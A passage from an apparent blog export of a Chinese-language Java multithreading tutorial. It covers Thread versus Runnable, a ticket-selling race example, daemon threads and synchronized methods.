class=\"line\">         TicketWindow tw=<span class=\"keyword\">new</span> TicketWindow();<span class=\"comment\">//创建TicketWindow的实例对象tw</span></span><br><span class=\"line\">        <span class=\"comment\">//这几个线程其实都在执行tw这个对象</span></span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口1&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口2&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口3&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口4&quot;</span>).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TicketWindow</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tickies=<span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"keyword\">true</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(tickies&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                Thread th= Thread.currentThread();<span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">                String th_name=th.getName();<span class=\"comment\">//获取线程名称</span></span><br><span class=\"line\">                System.out.println(th_name+<span class=\"string\">&quot;正在发售&quot;</span>+tickies--+<span class=\"string\">&quot;张票&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//可能会出现超卖的现象</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223234915498.png\" alt=\"image-20211223234915498\" style=\"zoom:67%;\" />\n\n<p>这样就不会出现重复卖票的情况,实现了tickies的共享</p>\n<p>Runnable接口还可以通过匿名对象来实现</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Runnable target=<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;子线程&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        Thread t=<span class=\"keyword\">new</span> Thread(target);</span><br><span class=\"line\">        t.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>还可以进一步简化上面的代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;子线程&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//jdk8后更简化</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> Thread(()-&gt;&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;子线程2&quot;</span>);</span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"第三种多线程实现方案\"><a href=\"#第三种多线程实现方案\" class=\"headerlink\" title=\"第三种多线程实现方案\"></a>第三种多线程实现方案</h4><h5 id=\"利用Callable-FutureTask接口实现\"><a href=\"#利用Callable-FutureTask接口实现\" class=\"headerlink\" title=\"利用Callable,FutureTask接口实现\"></a>利用Callable,FutureTask接口实现</h5><p><img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211224011547555.png\" alt=\"image-20211224011547555\"></p>\n<h5 id=\"线程的常用方法\"><a href=\"#线程的常用方法\" class=\"headerlink\" title=\"线程的常用方法\"></a>线程的常用方法</h5><p>setName //设置线程名称,使之与参数name相同</p>\n<p>getName  //返回该线程的名称</p>\n<p>常用<code>Thread.currentThread().getName()</code></p>\n<p>start //使该线程开始执行,java虚拟机底层调用该线程的start0方法</p>\n<p>run //调用线程对象run方法</p>\n<p>setPriority //更改线程优先级</p>\n<p>getPriority //获取线程的优先级</p>\n<p>sleep //在指定的毫秒数内让当前正在执行的线程休眠</p>\n<p>interrupt //中断线程,但是并没有真正结束线程,往往是中断休眠sleep,转而执行catch中的语句</p>\n<p>yield //是Thread的静态方法,直接<code>Thread.yield()</code>调用即可线程的礼让,让出cpu,让其他线程执行,但让出的时间不确定,所以也不一定礼让成功</p>\n<p>join //线程的插队.插队的线程一旦插队成功,则肯定先执行完插入的线程所有的任务</p>\n<p>案例:创建一个子线程,每隔1s输出hello,输出20次,主线程每隔一秒,输出hi,输出20次,要求:两个完成同时执行,当主线程输出5次后,就让子线程运行完毕,主线程再继续</p>\n<h5 id=\"用户线程和守护线程\"><a href=\"#用户线程和守护线程\" class=\"headerlink\" title=\"用户线程和守护线程\"></a>用户线程和守护线程</h5><p>1.用户线程:也叫工作线程,当线程的任务执行完或通知方式结束</p>\n<p>2.守护线程:一般是为工作线程服务的,当所有的用户线程结束,守护线程自动结束</p>\n<p>3.常见的守护线程:垃圾回收机制</p>\n<h5 id=\"如何把一个子线程设置为守护线程\"><a href=\"#如何把一个子线程设置为守护线程\" class=\"headerlink\" title=\"如何把一个子线程设置为守护线程\"></a>如何把一个子线程设置为守护线程</h5><p><code>myDaemonThread.setDaemon(true)</code>就可以把一个子线程设置为守护线程,主线程结束 它也结束</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S8_5</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        MyDaemonThread myDaemonThread=<span class=\"keyword\">new</span> MyDaemonThread();</span><br><span class=\"line\">        myDaemonThread.setDaemon(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        myDaemonThread.start();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">3</span>;i++)&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;主线程运行中&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyDaemonThread</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;子线程运行中&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>主线程结束后,子线程也会结束</p>\n<h5 id=\"线程的生命周期\"><a href=\"#线程的生命周期\" class=\"headerlink\" title=\"线程的生命周期\"></a>线程的生命周期</h5><img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211225234147135.png\" style=\"zoom: 80%;\" />\n\n<h4 id=\"线程同步机制\"><a href=\"#线程同步机制\" class=\"headerlink\" title=\"线程同步机制\"></a>线程同步机制</h4><p>在多线程编程中,一些敏感数据不允许被多个线程同时访问,此时就使用同步访问技术,保证数据在任何统一时刻,最多有一个线程访问,以保证数据的完整性</p>\n<p>也可以这样理解:线程同步,即当有一个线程在对内存进行操作时,其他线程都不可以对这个内存地址进行操作,知道该线程完成操作,其他线程才能对该内存地址进行操作</p>\n<h5 id=\"同步具体方法\"><a href=\"#同步具体方法\" class=\"headerlink\" title=\"同步具体方法\"></a>同步具体方法</h5><p>1.同步代码块</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">synchronized</span>(对象)&#123;<span class=\"comment\">//得到对象的锁,才能操作同步代码</span></span><br><span class=\"line\">\t<span class=\"comment\">//需要被同步的代码</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2.synchronized还可以放在方法声明中,表示整个方法为同步方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">m</span><span class=\"params\">(String name)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//需要被同步的代码</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.如何理解</p>\n<p>就好像上厕所,A上厕所关上门(上锁),完事出来后(解锁),那么其他人就可以再使用厕所了</p>\n<p>例子</p>\n<p>之前的售票窗口程序,通过继承Runnable接口,虽然实现了票数的共享,但是售票顺序是乱的</p>\n<p><a href=\"#sell\">售票窗口程序</a></p>\n<p>通过线程同步,就可以实现每次只卖一张票,也就是每次只允许一个线程访问tickies变量并执行,这样还可以防止超卖现象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S8_1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">         TicketWindow tw=<span class=\"keyword\">new</span> TicketWindow();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口1&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口2&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口3&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口4&quot;</span>).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TicketWindow</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tickies=<span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> loop=<span class=\"keyword\">true</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">sell</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(tickies&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                Thread th= Thread.currentThread();<span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">                String th_name=th.getName();<span class=\"comment\">//获取线程名称</span></span><br><span class=\"line\">                System.out.println(th_name+<span class=\"string\">&quot;正在发售&quot;</span>+tickies--+<span class=\"string\">&quot;张票&quot;</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                loop=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(loop)&#123;</span><br><span class=\"line\">            sell();<span class=\"comment\">//sell是一种同步方法</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由运行结果可知,票按照tickies大小逐次递减卖出,就是不知道为啥,每次只有一到两个线程能抢到cpu资源并且执行</p>\n<p><img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211226000540093.png\" alt=\"image-20211226000540093\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"多线程相关概念\"><a href=\"#多线程相关概念\" class=\"headerlink\" title=\"多线程相关概念\"></a>多线程相关概念</h4><p>并发:同一个时刻,多个任务交替执行,造成一种貌似同时的错觉,简单的说,单核CPU实现的多任务就是并发</p>\n<p>并行:同一个时刻,多个任务同时执行,多核CPU可以实现并行</p>\n<h4 id=\"两种实现多线程方式的对比分析\"><a href=\"#两种实现多线程方式的对比分析\" class=\"headerlink\" title=\"两种实现多线程方式的对比分析\"></a>两种实现多线程方式的对比分析</h4><p>直接继承Thread类和实现Runnable接口都能实现多线程,具体有什么区别呢</p>\n<p>1.从java的设计来看,通过继承Thread或者实现Runnable接口来创建线程本质上都没有区别,Thread类本身就实现了Runnable接口</p>\n<p>2.实现Runnable接口方式更加适合多个线程共享一个资源的情况,并且避免了单继承的限制</p>\n<h4 id=\"直接继承Thread\"><a href=\"#直接继承Thread\" class=\"headerlink\" title=\"直接继承Thread\"></a>直接继承Thread</h4><p>通过两段代码来对比一下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S8_1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> TicketWindow().start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> TicketWindow().start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> TicketWindow().start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> TicketWindow().start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TicketWindow</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tickies=<span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"comment\">//重写run方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"keyword\">true</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(tickies&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                Thread th= Thread.currentThread();<span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">                String th_name=th.getName();<span class=\"comment\">//获取当前线程名称</span></span><br><span class=\"line\">                System.out.println(th_name+<span class=\"string\">&quot;正在发售&quot;</span>+tickies--+<span class=\"string\">&quot;张票&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223233326400.png\" alt=\"image-20211223233326400\"></p>\n<p>由运行结果可知,当前每个线程处于”各卖各的票”的情况,对tickies没有实现共享</p>\n<h5 id=\"为什么不调用run方法而调用start方法\"><a href=\"#为什么不调用run方法而调用start方法\" class=\"headerlink\" title=\"为什么不调用run方法而调用start方法?\"></a>为什么不调用run方法而调用start方法?</h5><p>因为run方法就只是一个普通的方法,没有真正的启动一个线程</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">start</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    start0();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">native</span> <span class=\"keyword\">void</span> <span class=\"title\">start0</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"comment\">//start0()是本地方法(native),是JVM调用,底层是c/c++实现</span></span><br><span class=\"line\"><span class=\"comment\">//真正实现多线程的效果,是start0()方法</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>start()方法调用start0()方法后,该线程并不一定会立刻执行,只是将线程变成了可运行状态,具体什么时候执行,取决于cpu,由cpu统一调度</strong></p>\n<h4 id=\"实现Runnable接口\"><a href=\"#实现Runnable接口\" class=\"headerlink\" title=\"实现Runnable接口\"></a>实现Runnable接口</h4><h5 id=\"代理模式\"><a href=\"#代理模式\" class=\"headerlink\" title=\"代理模式\"></a>代理模式</h5><p><span id=\"example\">例子</span></p>\n<p>该方法底层使用了一个设计模式<strong>线程代理模式</strong>,接下来用代码进行模拟,代码和真正有差别,但是原理一样</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">proxy</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Tiger tiger=<span class=\"keyword\">new</span> Tiger();<span class=\"comment\">//Tiger类实现了Runnable接口</span></span><br><span class=\"line\">        ThreadProxy threadProxy = <span class=\"keyword\">new</span> ThreadProxy(tiger);<span class=\"comment\">//为什么能把tiger放进去,因为tiger实现了Runnable</span></span><br><span class=\"line\">        threadProxy.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Animal</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Tiger</span> <span class=\"keyword\">extends</span> <span class=\"title\">Animal</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;老虎嗷嗷叫&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadProxy</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Runnable target =<span class=\"keyword\">null</span>;<span class=\"comment\">//类型是Runnable的属性</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(target!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            target.run();<span class=\"comment\">//动态绑定,最后调用的还是tiger的run</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//构造方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ThreadProxy</span><span class=\"params\">(Runnable target)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.target=target;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">start</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        start0();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">start0</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">总的来说就是,Tiger没有start方法,但是通过实现Runnable接口,就可以通过Runnable做中间代理从而使用Runnable中的start方法来调用Tiger的run方法实现线程的启动</span><br></pre></td></tr></table></figure>\n\n<p>在通常的开发当中，一般会选择实现Runnable接口，原因有二：<br>1、避免单继承的局限，在Java当中一个类可以实现多个接口，但只能继承一个类<br>2、适合资源的共享</p>\n<p>缺点:编程多一层对象包装,如果线程有执行结果是不可以直接返回的</p>\n<p><span id=\"sell\">售票程序</span></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S8_1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">         TicketWindow tw=<span class=\"keyword\">new</span> TicketWindow();<span class=\"comment\">//创建TicketWindow的实例对象tw</span></span><br><span class=\"line\">        <span class=\"comment\">//这几个线程其实都在执行tw这个对象</span></span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口1&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口2&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口3&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口4&quot;</span>).start();</span><br><span class=\"line\">    &#125;</span><br><span 